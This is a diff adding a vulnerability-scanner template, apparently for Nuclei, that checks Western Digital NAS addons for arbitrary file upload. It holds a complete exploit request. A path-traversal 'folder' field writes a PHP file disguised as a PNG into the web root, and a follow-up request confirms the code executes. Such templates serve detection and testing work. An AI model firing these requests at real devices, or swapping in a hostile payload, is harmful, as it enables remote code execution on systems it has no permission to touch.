@@ -1,0 +1,60 @@
+id: poc-yaml-west-nas-addons-anyfile-upload
+info:
+  name: Western Digital NAS addons arbitrary file upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects arbitrary file upload vulnerability in Western Digital NAS addons, allowing attackers to upload malicious files and execute them.
+
+variables:
+  random_number: '{{rand_int(1000, 10000)}}'
+  random_md5: '{{md5(random_number)}}'
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/web/addons/upload.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+    body: |-
+      ------WebKitFormBoundary
+      Content-Disposition: form-data; name="folder"
+
+      /../../../../../../../../var/www/
+      ------WebKitFormBoundary
+      Content-Disposition: form-data; name="name"
+
+      1
+      ------WebKitFormBoundary
+      Content-Disposition: form-data; name="index"
+
+      {{random_number}}.php
+      ------WebKitFormBoundary
+      Content-Disposition: form-data; name="file"; filename="1.png"
+
+      <?=md5({{random_number}});unlink(__FILE__);
+      ------WebKitFormBoundary--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+
+  - id: file-execution-check
+    method: GET
+    path:
+      - "{{BaseURL}}/1-{{random_number}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{random_md5}}"
+        part: body
